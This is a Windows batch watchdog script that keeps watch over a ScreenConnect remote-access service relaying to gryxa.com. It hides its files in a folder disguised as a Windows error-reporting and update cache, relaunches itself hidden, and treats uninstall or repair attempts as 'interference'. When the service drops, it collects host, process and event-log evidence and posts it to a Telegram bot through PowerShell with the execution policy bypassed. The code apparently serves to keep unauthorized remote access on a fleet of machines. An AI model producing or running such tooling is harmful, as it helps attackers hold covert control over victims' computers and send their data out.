@echo off
rem GRYXA_WATCH BUILD 20260804W3 - continuous Gryxa interference recorder + Telegram on DROP
rem W3: no RESTORED on first sample (UNKNOWN->UP was flooding TG when LOOP armed)
setlocal EnableExtensions EnableDelayedExpansion

set "MODE=%~1"
if /I "%MODE%"=="" set "MODE=LOOP"
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\gryxa_watch.log"
set "TRACE=%WD%\drop_trace.log"
set "EVT=%WD%\drop_events"
set "HB=%WD%\gryxa_watch.hb"
set "PIDF=%WD%\gryxa_watch.pid"
set "REASON=%WD%\drop_last_reason.txt"
set "LASTTG=%WD%\drop_last_tg.txt"
set "SEC=4"
set "BUILD=W3"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%EVT%" mkdir "%EVT%" >nul 2>&1

if /I "%MODE%"=="TICK" goto :DoTick
if /I "%MODE%"=="LOOP" goto :DoLoop
goto :DoLoop

:DoLoop
rem single-instance: if another LOOP heartbeating, exit
if exist "%HB%" (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HB%') -and (((Get-Date)-(Get-Item -LiteralPath '%HB%').LastWriteTime).TotalSeconds -lt 20)){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo [%DATE% %TIME%] loop_already_alive skip>>"%LOG%"
    endlocal & exit /b 0
  )
)
echo %DATE% %TIME% %RANDOM%>"%PIDF%"
echo [%DATE% %TIME%] LOOP start build=%BUILD% host=%COMPUTERNAME%>>"%LOG%"
echo [%DATE% %TIME%] LOOP start build=%BUILD%>>"%TRACE%"
set "PREV=UNKNOWN"
set "PREV_IMG="
set "PREV_MSI=0"

:Loop
call :Sample
echo %DATE% %TIME% state=!NOW! why=!WHY! any=!ANY! msi=!MSI_N!>>"%HB%"

if /I not "!PREV!"=="!NOW!" (
  echo [%DATE% %TIME%] TRANSITION !PREV! -^> !NOW! why=!WHY! any=!ANY! img_chg=!IMG_CHG! msi=!MSI_N!>>"%LOG%"
  echo [%DATE% %TIME%] TRANSITION !PREV! -^> !NOW! why=!WHY! any=!ANY! img_chg=!IMG_CHG! msi=!MSI_N!>>"%TRACE%"
  call :LogInterference TRANSITION
  echo !PREV!| findstr /I /C:"UP" >nul
  if not errorlevel 1 (
    echo !NOW!| findstr /I /C:"UP" >nul
    if errorlevel 1 (
      call :OnDrop "!PREV!" "!NOW!" "!WHY!"
    )
  )
  echo !NOW!| findstr /I /C:"UP" >nul
  if not errorlevel 1 (
    rem do not treat initial UNKNOWN->UP as a restore (fleet false RESTORED spam)
    if /I not "!PREV!"=="UNKNOWN" (
      echo !PREV!| findstr /I /C:"UP" >nul
      if errorlevel 1 (
        call :OnRestore "!PREV!" "!NOW!"
      )
    )
  )
  set "PREV=!NOW!"
)

rem ImagePath change while UP = interference even without full drop
if defined CUR_IMG if defined PREV_IMG if /I not "!CUR_IMG!"=="!PREV_IMG!" (
  echo [%DATE% %TIME%] IMAGEPATH_CHANGE>>"%LOG%"
  echo [%DATE% %TIME%] IMAGEPATH_CHANGE old=!PREV_IMG!>>"%TRACE%"
  echo [%DATE% %TIME%] IMAGEPATH_CHANGE new=!CUR_IMG!>>"%TRACE%"
  call :LogInterference IMAGEPATH_CHANGE
)
set "PREV_IMG=!CUR_IMG!"

rem msiexec appeared
if !MSI_N! GTR 0 if "!PREV_MSI!"=="0" (
  echo [%DATE% %TIME%] MSIEXEC_SEEN n=!MSI_N!>>"%LOG%"
  echo [%DATE% %TIME%] MSIEXEC_SEEN>>"%TRACE%"
  call :LogInterference MSIEXEC_SEEN
  call :DumpMsiCmd
)
set "PREV_MSI=!MSI_N!"

timeout /t %SEC% /nobreak >nul
goto :Loop

:DoTick
call :Sample
echo %DATE% %TIME% TICK state=!NOW! why=!WHY! any=!ANY! msi=!MSI_N!>>"%TRACE%"
echo %DATE% %TIME% tick>>"%HB%"
rem if LOOP dead, restart it
powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HB%') -and (((Get-Date)-(Get-Item -LiteralPath '%HB%').LastWriteTime).TotalSeconds -lt 25)){exit 0}else{exit 1}" >nul 2>&1
if errorlevel 1 (
  echo [%DATE% %TIME%] tick_restart_loop>>"%LOG%"
  wmic process call create "cmd.exe /c \"%~f0\" LOOP" >nul 2>&1
  if errorlevel 1 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%~f0\" LOOP' -WindowStyle Hidden" >nul 2>&1
)
endlocal & exit /b 0

:Sample
set "NOW=DOWN"
set "WHY=unknown"
set "ANY=0"
set "MSI_N=0"
set "CUR_IMG="
set "IMG_CHG=0"
set "LIVE_FP="

sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "NOW=ABSENT"
  set "WHY=1060-service-missing"
) else (
  for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2^>nul ^| findstr /I "ImagePath"') do set "CUR_IMG=%%B"
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (
    set "NOW=UP"
    set "WHY=running"
    echo !CUR_IMG!| findstr /I "gryxa.com" >nul
    if errorlevel 1 (
      set "NOW=UP_NORELAY"
      set "WHY=running-NO-gryxa.com-ImagePath"
    )
  ) else (
    sc query "%SVC%" | findstr /I /C:"STOPPED" >nul
    if not errorlevel 1 (
      set "NOW=STOPPED"
      set "WHY=service-STOPPED"
      echo !CUR_IMG!| findstr /I "gryxa.com" >nul
      if not errorlevel 1 set "WHY=STOPPED-but-ImagePath-has-gryxa.com"
      if errorlevel 1 set "WHY=STOPPED-NO-gryxa.com"
    ) else (
      set "NOW=OTHER"
      set "WHY=service-other-state"
    )
  )
)

for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP%" if /I not "!_FP!"=="%ALT%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 (
      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
      if not errorlevel 1 (
        set "ANY=1"
        set "LIVE_FP=!_FP!"
      )
    )
  )
)

for /f %%N in ('tasklist /FI "IMAGENAME eq msiexec.exe" 2^>nul ^| find /C /I "msiexec.exe"') do set "MSI_N=%%N"
goto :eof

:LogInterference
set "TAG=%~1"
>>"%TRACE%" echo --- %TAG% %DATE% %TIME% ---
>>"%TRACE%" echo state=!NOW! why=!WHY! any=!ANY! live_fp=!LIVE_FP! msi=!MSI_N!
sc query "%SVC%" >>"%TRACE%" 2>&1
if exist "%WD%\gryxa_heal.flag" (
  >>"%TRACE%" echo heal_flag=
  type "%WD%\gryxa_heal.flag" >>"%TRACE%"
)
if exist "%WD%\force_gryxa.new" (
  >>"%TRACE%" echo force_new=
  type "%WD%\force_gryxa.new" >>"%TRACE%"
)
if exist "%WD%\observe.flag" (>>"%TRACE%" echo observe=ON) else (>>"%TRACE%" echo observe=off)
goto :eof

:DumpMsiCmd
>>"%TRACE%" echo --- msiexec cmdline ---
wmic process where "name='msiexec.exe'" get ProcessId,ParentProcessId,CommandLine /FORMAT:LIST >>"%TRACE%" 2>nul
goto :eof

:OnDrop
set "PPREV=%~1"
set "PNOW=%~2"
set "PWHY=%~3"
set "TS=%TIME::=%"
set "TS=!TS:.=!"
set "TS=!TS: =0!"
set "DF=%EVT%\drop_%COMPUTERNAME%_!TS!.txt"
set "DF=!DF:/=_!"

call :BuildReason "%PPREV%" "%PNOW%" "%PWHY%"
echo !CAUSE!> "%REASON%"

> "!DF!" echo ===== GRYXA DROP %DATE% %TIME% host=%COMPUTERNAME% watch=%BUILD% =====
>>"!DF!" echo PREV=%PPREV% NOW=%PNOW%
>>"!DF!" echo CAUSE=!CAUSE!
>>"!DF!" echo DETAIL=!DETAIL!
>>"!DF!" echo.
call :WriteEvidence "!DF!"

echo [%DATE% %TIME%] DROP cause=!CAUSE! file=!DF!>>"%LOG%"
echo [%DATE% %TIME%] DROP cause=!CAUSE! file=!DF!>>"%TRACE%"

call :SendTgDrop "!DF!"
goto :eof

:OnRestore
echo [%DATE% %TIME%] RESTORE %~1 -^> %~2>>"%LOG%"
echo [%DATE% %TIME%] RESTORE %~1 -^> %~2>>"%TRACE%"
if exist "%WD%\tg_report.ps1" if exist "%WD%\notify.cfg" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State RESTORED -Summary "Gryxa back UP after drop (watch %BUILD%)" -Build WATCH-%BUILD% >nul 2>&1
)
goto :eof

:BuildReason
set "CAUSE=UNKNOWN"
set "DETAIL=%~3"

rem Priority: our tooling markers in last 2 minutes of logs
set "HIT_OUR=0"
set "HIT_MSI_X=0"
set "HIT_FORCE=0"
set "HIT_HEAL=0"
set "HIT_SCM=0"

if exist "%WD%\own_gryxa.log" (
  findstr /I /C:"msiexec /x" /C:"preclean_gryxa" /C:"heal_1060" /C:"REINSTALL" "%WD%\own_gryxa.log" >nul 2>&1 && set "HIT_MSI_X=1"
)
if exist "%WD%\own_mon.log" (
  findstr /I /C:"gryxa_force" /C:"force_push" /C:"QueueGryxaHeal REINSTALL" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_FORCE=1"
  findstr /I /C:"gryxa_heal_queued" /C:"gryxa_1060_queue_heal" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_HEAL=1"
)
if !MSI_N! GTR 0 set "HIT_OUR=1"
if "!HIT_MSI_X!"=="1" set "CAUSE=OUR_MSI_UNINSTALL"
if "!HIT_FORCE!"=="1" if /I "!CAUSE!"=="UNKNOWN" set "CAUSE=OUR_FORCE_REINSTALL"
if "!HIT_HEAL!"=="1" if /I "!CAUSE!"=="UNKNOWN" set "CAUSE=OUR_HEAL_PATH"
if !MSI_N! GTR 0 if /I "!CAUSE!"=="UNKNOWN" set "CAUSE=MSIEXEC_RUNNING_AT_DROP"

if /I "!CAUSE!"=="UNKNOWN" (
  if /I "%~2"=="ABSENT" set "CAUSE=SERVICE_DELETED_1060"
  if /I "%~2"=="STOPPED" (
    echo %~3| findstr /I "gryxa.com" >nul
    if not errorlevel 1 (set "CAUSE=SERVICE_STOPPED_RELAY_OK") else (set "CAUSE=SERVICE_STOPPED_NO_RELAY")
  )
  if /I "%~2"=="UP_NORELAY" set "CAUSE=RUNNING_BUT_IMAGEPATH_LOST_RELAY"
  if /I "%~2"=="OTHER" set "CAUSE=SERVICE_STATE_FLAP"
)

if "!ANY!"=="1" if /I not "!CAUSE!"=="UNKNOWN" set "DETAIL=!DETAIL!|other_gryxa_still_up=!LIVE_FP!"
if "!ANY!"=="0" if /I "%~2"=="ABSENT" set "DETAIL=!DETAIL!|no_other_gryxa_relay"

rem refine from App log quickly via PS into temp
set "EVT_HINT="
powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-5); $e=Get-WinEvent -FilterHashtable @{LogName='Application';StartTime=$s} -EA 0 | ?{ $_.ProviderName -match 'MsiInstaller' -and $_.Message -match '9D7CC418|ScreenConnect|36e506ff' } | Select-Object -First 1; if($e){ $m=$e.Message; if($m.Length -gt 160){$m=$m.Substring(0,160)}; Write-Output ('MSI:'+$e.TimeCreated.ToString('HH:mm:ss')+':'+$m) }" >"%WD%\drop_evt_hint.tmp" 2>nul
if exist "%WD%\drop_evt_hint.tmp" (
  set /p EVT_HINT=<"%WD%\drop_evt_hint.tmp"
  if defined EVT_HINT (
    echo !EVT_HINT!| findstr /I "removing uninstall remove" >nul && set "CAUSE=MSI_UNINSTALL_EVENT"
    set "DETAIL=!DETAIL!|!EVT_HINT!"
  )
)

powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-5); $e=Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='Service Control Manager';StartTime=$s} -EA 0 | ?{ $_.Message -match 'ScreenConnect' } | Select-Object -First 1; if($e){ $m=$e.Message; if($m.Length -gt 140){$m=$m.Substring(0,140)}; Write-Output ('SCM:'+$e.Id+':'+$e.TimeCreated.ToString('HH:mm:ss')+':'+$m) }" >"%WD%\drop_scm_hint.tmp" 2>nul
if exist "%WD%\drop_scm_hint.tmp" (
  set /p SCM_HINT=<"%WD%\drop_scm_hint.tmp"
  if defined SCM_HINT set "DETAIL=!DETAIL!|!SCM_HINT!"
)

set "DETAIL=!DETAIL!|prev=%~1|now=%~2|msi_n=!MSI_N!"
goto :eof

:WriteEvidence
set "EF=%~1"
>>"%EF%" echo --- service ---
sc query "%SVC%" >>"%EF%" 2>&1
sc qc "%SVC%" >>"%EF%" 2>&1
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath >>"%EF%" 2>&1

>>"%EF%" echo.
>>"%EF%" echo --- all SC ---
sc query state= all | findstr /C:"ScreenConnect Client" >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo --- processes ---
wmic process where "name='msiexec.exe' or name='ScreenConnect.ClientService.exe' or name='ScreenConnect.WindowsClient.exe'" get ProcessId,ParentProcessId,CommandLine /FORMAT:LIST >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo --- flags ---
if exist "%WD%\gryxa_heal.flag" (>>"%EF%" echo HEAL: & type "%WD%\gryxa_heal.flag" >>"%EF%") else (>>"%EF%" echo HEAL:absent)
if exist "%WD%\force_gryxa.new" (>>"%EF%" echo FORCE_NEW: & type "%WD%\force_gryxa.new" >>"%EF%") else (>>"%EF%" echo FORCE_NEW:absent)
if exist "%WD%\force_gryxa.done" (>>"%EF%" echo FORCE_DONE: & type "%WD%\force_gryxa.done" >>"%EF%") else (>>"%EF%" echo FORCE_DONE:absent)
if exist "%WD%\observe.flag" (>>"%EF%" echo OBSERVE:ON) else (>>"%EF%" echo OBSERVE:off)
if exist "%WD%\gryxa.cfg" (>>"%EF%" echo CFG: & type "%WD%\gryxa.cfg" >>"%EF%")

>>"%EF%" echo.
>>"%EF%" echo --- App MsiInstaller/ScreenConnect 10m ---
powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-10); Get-WinEvent -FilterHashtable @{LogName='Application';StartTime=$s} -EA 0 | ?{ $_.ProviderName -match 'MsiInstaller|ScreenConnect' -or $_.Message -match 'ScreenConnect|9D7CC418|36e506ff' } | Select-Object -First 25 TimeCreated,ProviderName,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(220,$_.Message.Length))}} | Format-List" >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo --- System SCM ScreenConnect 10m ---
powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-10); Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='Service Control Manager';StartTime=$s} -EA 0 | ?{ $_.Message -match 'ScreenConnect' } | Select-Object -First 20 TimeCreated,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(220,$_.Message.Length))}} | Format-List" >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo --- mon log kill hits (tail) ---
if exist "%WD%\own_mon.log" (
  findstr /I /C:"gryxa_" /C:"heal" /C:"force" /C:"msiexec" /C:"1060" /C:"OBSERVE" "%WD%\own_mon.log" >"%WD%\drop_mon_hits.tmp" 2>nul
  powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\drop_mon_hits.tmp' -Tail 35 -EA 0" >>"%EF%" 2>nul
  powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\own_mon.log' -Tail 40" >>"%EF%" 2>nul
)

>>"%EF%" echo.
>>"%EF%" echo --- own_gryxa.log tail ---
if exist "%WD%\own_gryxa.log" powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\own_gryxa.log' -Tail 50" >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo --- drop_trace tail ---
if exist "%TRACE%" powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%TRACE%' -Tail 40" >>"%EF%" 2>nul

>>"%EF%" echo.
>>"%EF%" echo ===== END DROP EVIDENCE =====
goto :eof

:SendTgDrop
set "EF=%~1"
rem rate-limit identical cause (5 min)
if exist "%LASTTG%" (
  set /p LASTCAUSE=<"%LASTTG%"
  if /I "!LASTCAUSE!"=="!CAUSE!" (
    powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LASTTG%') -and (((Get-Date)-(Get-Item -LiteralPath '%LASTTG%').LastWriteTime).TotalMinutes -lt 5)){exit 0}else{exit 1}" >nul 2>&1
    if not errorlevel 1 (
      echo [%DATE% %TIME%] tg_drop_rate_limited cause=!CAUSE!>>"%LOG%"
      goto :eof
    )
  )
)

set "TGOK=0"
if exist "%WD%\notify.cfg" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
    "$ErrorActionPreference='Stop'; $wd='%WD%'; $ef='%~1'; $cfg=@{}; Get-Content (Join-Path $wd 'notify.cfg') | ForEach-Object { if($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$'){ $cfg[$matches[1]]=$matches[2].Trim() } }; if(-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID){ exit 2 }; $cause=(Get-Content (Join-Path $wd 'drop_last_reason.txt') -EA SilentlyContinue | Select-Object -First 1); if(-not $cause){$cause='UNKNOWN'}; $hint=''; foreach($f in @('drop_evt_hint.tmp','drop_scm_hint.tmp')){ $p=Join-Path $wd $f; if(Test-Path $p){ $hint += (Get-Content $p -Raw).Trim() + ' | ' } }; $snip=''; if(Test-Path $ef){ $snip=((Get-Content -LiteralPath $ef -TotalCount 40) -join \"`n\") }; $body=@( '# GRYXA DROP', ('Host: ' + $env:COMPUTERNAME), ('CAUSE: ' + $cause), ('HINT: ' + $hint), ('Evidence: ' + $ef), ('Time: ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')), '', $snip ) -join \"`n\"; if($body.Length -gt 3500){ $body=$body.Substring(0,3500) + \"`n...TRUNC\" }; $payload=@{ chat_id=$cfg.CHAT_ID; text=$body; disable_web_page_preview=$true } | ConvertTo-Json -Compress; $bytes=[Text.Encoding]::UTF8.GetBytes($payload); Invoke-RestMethod -Uri (\"https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage\") -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' | Out-Null" >nul 2>&1
  if not errorlevel 1 set "TGOK=1"
)

if "!TGOK!"=="0" if exist "%WD%\tg_report.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State GDROP -Summary "CAUSE=!CAUSE! file=%~1" -Build WATCH-%BUILD% >nul 2>&1
  if not errorlevel 1 set "TGOK=1"
)

if "!TGOK!"=="1" (
  echo !CAUSE!>"%LASTTG%"
  echo [%DATE% %TIME%] tg_drop_sent cause=!CAUSE!>>"%LOG%"
) else (
  echo [%DATE% %TIME%] tg_drop_FAILED cause=!CAUSE! file=%~1>>"%LOG%"
)
goto :eof
